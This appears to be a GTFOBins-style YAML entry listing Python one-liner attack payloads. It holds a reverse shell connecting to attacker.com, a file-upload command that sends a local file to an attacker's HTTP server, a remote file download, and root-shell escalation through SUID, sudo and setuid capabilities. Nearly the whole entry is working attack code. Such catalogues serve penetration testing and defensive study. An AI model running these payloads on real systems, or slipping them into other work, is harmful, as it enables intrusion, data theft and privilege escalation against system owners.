---
description: The payloads are compatible with both Python version 2 and 3.
functions:
  shell:
    - code: python -c 'import os; os.system("/bin/sh")'
  reverse-shell:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        python -c 'import sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")'
  file-upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
    - description: Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["URL"], e["LFILE"])'
  file-write:
    - code: python -c 'open("file_to_write","w+").write("DATA")'
  file-read:
    - code: python -c 'print(open("file_to_read").read())'
  library-load:
    - code: python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
  suid:
    - code: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  sudo:
    - code: sudo python -c 'import os; os.system("/bin/sh")'
  capabilities:
    - code: ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
---
